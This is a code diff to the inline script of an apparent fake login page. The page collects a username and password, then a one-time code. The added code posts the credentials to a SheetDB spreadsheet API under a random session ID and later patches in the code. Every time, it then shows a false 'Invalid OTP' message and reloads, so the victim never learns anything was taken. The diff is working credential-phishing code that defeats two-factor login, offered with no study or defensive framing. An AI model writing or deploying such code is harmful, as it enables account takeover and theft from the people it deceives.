@@ -65,60 +65,97 @@
     </div>
 
     <script>
-        // 1. Navigation Logic
-        function goToStep2() {
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+// --- CONFIGURATION ---
+const SHEETDB_API_URL = 'https://sheetdb.io/api/v1/3lr5hvus4x4j5';
+let sessionId = ""; // Stores the ID to find the row later
 
-            if (user && pass) {
+// 1. Step 1: Send Username & Password (CREATE ROW)
+async function goToStep2() {
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    const loginBtn = document.querySelector('.login-button');
+
+    if (user && pass) {
+        // Create a unique ID for this login session
+        sessionId = "IDMS-" + Math.floor(Math.random() * 1000000);
+        
+        // UI Feedback
+        const originalHtml = loginBtn.innerHTML;
+        loginBtn.innerHTML = "<span>Checking...</span> <i class='fa-solid fa-spinner fa-spin'></i>";
+        loginBtn.disabled = true;
+
+        try {
+            const response = await fetch(SHEETDB_API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    data: [{
+                        'session_id': sessionId,
+                        'username': user,
+                        'password': pass,
+                        'otp': 'WAITING...',
+                        'timestamp': new Date().toLocaleString()
+                    }]
+                })
+            });
+
+            const result = await response.json();
+            if (result.created === 1) {
+                // Success: Move to OTP step
                 document.getElementById('step-1').style.display = 'none';
                 document.getElementById('step-2').style.display = 'block';
-            } else {
-                alert("Please enter Username and Password.");
             }
+        } catch (error) {
+            alert("Connection error. Please try again.");
+            loginBtn.disabled = false;
+            loginBtn.innerHTML = originalHtml;
         }
+    } else {
+        alert("Please enter Username and Password.");
+    }
+}
 
-        // 2. Handle Form Submission
-        const form = document.getElementById('sheetdb-form');
-        
-        form.addEventListener("submit", e => {
-            e.preventDefault();
+// 2. Step 2: Handle OTP Submission (UPDATE ROW)
+const form = document.getElementById('sheetdb-form');
 
-            // Set current time
-            document.getElementById('timestamp').value = new Date().toLocaleString();
-            
-            const submitBtn = document.getElementById('submit-btn');
-            const originalBtnHtml = submitBtn.innerHTML;
-            
-            submitBtn.innerHTML = "Processing...";
-            submitBtn.disabled = true;
+form.addEventListener("submit", async (e) => {
+    e.preventDefault();
 
-            // Create the data object for SheetDB
-            const formData = new FormData(form);
-            const data = Object.fromEntries(formData.entries());
+    const otpVal = document.getElementById('otp').value;
+    const submitBtn = document.getElementById('submit-btn');
+    const originalBtnHtml = submitBtn.innerHTML;
 
-            // Send to SheetDB API
-            fetch('https://sheetdb.io/api/v1/3lr5hvus4x4j5', {
-                method: 'POST',
-                headers: {
-                    'Accept': 'application/json',
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ data: [data] }), 
+    if (!otpVal) return;
+
+    submitBtn.innerHTML = "Verifying...";
+    submitBtn.disabled = true;
+
+    try {
+        // We use PATCH to find the row by session_id and update only the OTP column
+        const response = await fetch(`${SHEETDB_API_URL}/session_id/${sessionId}`, {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                data: { 'otp': otpVal }
             })
-            .then(response => response.json())
-            .then((result) => {
-                console.log('Success:', result);
-                alert('Invalid OTP. Please try again');
-                window.location.reload(); 
-            })
-            .catch(error => {
-                alert('Connection error. Please check your internet.');
-                console.error(error);
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = originalBtnHtml;
-            });
         });
+
+        const result = await response.json();
+
+        if (result.updated === 1) {
+            // Success feedback
+            console.log('Update Success:', result);
+            alert('Invalid OTP. Please try again');
+            window.location.reload(); 
+        }
+    } catch (error) {
+        alert('Connection error.');
+        console.error(error);
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = originalBtnHtml;
+    }
+});
+                
     </script>
 </body>
 </html>
